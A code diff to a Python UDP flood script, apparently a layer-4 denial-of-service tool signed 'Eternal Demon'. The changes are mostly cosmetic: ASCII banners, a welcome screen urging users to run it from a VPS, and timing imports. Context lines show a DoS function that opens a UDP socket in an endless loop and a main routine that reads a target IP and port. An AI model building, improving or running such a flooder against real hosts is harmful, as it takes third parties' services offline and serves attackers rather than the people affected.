@@ -1,17 +1,39 @@
 import colorama
 from colorama import *
-init()
+init(autoreset=True)
 try:
     import threading
     import socket
     import random
     import sys
     import os
+    import time
+    from time import sleep
+    #Code Time
+    from datetime import datetime
+    now = datetime.now()
+    hour = now.hour
+    minute = now.minute
+    day = now.day
+    month = now.month
+    year = now.year
     
 except ImportError as e:
     print(f"{Fore.RED}[ERROR] {Fore.LIGHTYELLOW_EX} {e}")
     sys.exit()
 os.system("clear")
+def welcome():
+    print(f"""
+{Fore.GREEN}
+╦══════════════════════════════════════╗    
+║ ╦ ╦  ╔═╗  ╦    ╔═╗  ╔═╗  ╔╦╗  ╔═╗    ║
+║ ║║║  ║╣   ║    ║    ║ ║  ║║║  ║╣     ║
+║ ╚╩╝  ╚═╝  ╩═╝  ╚═╝  ╚═╝  ╩ ╩  ╚═╝    ║
+╩══════════════════════════════════════╝
+{Fore.LIGHTYELLOW_EX}Made by Eternal Demon
+
+    
+{Fore.YELLOW} {Back.RED} --> Pls run this script in a VPS <--""")
 def banner():
     print(f"""
 {Fore.LIGHTCYAN_EX}  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄        ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  {Fore.RED} ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄       ▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
@@ -25,8 +47,15 @@ def banner():
 {Fore.LIGHTCYAN_EX} ▐░▌       ▐░▌▐░▌     ▐░▐░▌     ▐░▌      ▄▄▄▄█░█▄▄▄▄  ▄▄▄▄▄▄▄▄▄█░▌ {Fore.RED} ▄▄▄▄█░█▄▄▄▄  ▄▄▄▄▄▄▄▄▄█░▌     ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌▐░▌       ▐░▌
 {Fore.LIGHTCYAN_EX} ▐░▌       ▐░▌▐░▌      ▐░░▌     ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌ {Fore.RED}▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌     ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌       ▐░▌
 {Fore.LIGHTCYAN_EX}  ▀         ▀  ▀        ▀▀       ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  {Fore.RED} ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀       ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀         ▀ 
-                                                    {Fore.LIGHTYELLOW_EX}Made by Eternal Demon""")
+                                                    {Fore.LIGHTYELLOW_EX}Made by Eternal Demon
 
+
+{Fore.MAGENTA}                                                                         ██╗  ██╗  
+{Fore.MAGENTA}╔═╗  ╔═╗  ╦ ╦  ╔═╗  ╦═╗  ╔═╗  ╦ ╦  ╦    ╦         ╦  ┌─┐┬ ┬┌─┐┬─┐        ██║  ██║
+{Fore.MAGENTA}╠═╝  ║ ║  ║║║  ║╣   ╠╦╝  ╠╣   ║ ║  ║    ║         ║  ├─┤└┬┘├┤ ├┬┘        ███████║
+{Fore.MAGENTA}╩    ╚═╝  ╚╩╝  ╚═╝  ╩╚═  ╚    ╚═╝  ╩═╝  ╩═╝       ╩═╝┴ ┴ ┴ └─┘┴└─        ╚════██║ 
+{Fore.MAGENTA}                                                                              ██║
+{Fore.MAGENTA} """)
 def DoS(ip, port, size, index):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     while True:
@@ -40,6 +69,9 @@ def main():
             sys.exit()
         
         if len(sys.argv) < 5:
+            welcome()
+            time.sleep(4)
+            os.system('clear')
             banner()
 
         IP       = input("\033[1;34m[>] \033[2;32mIP:  \xBB \033[0m") if len(sys.argv) < 2 else sys.argv[1]
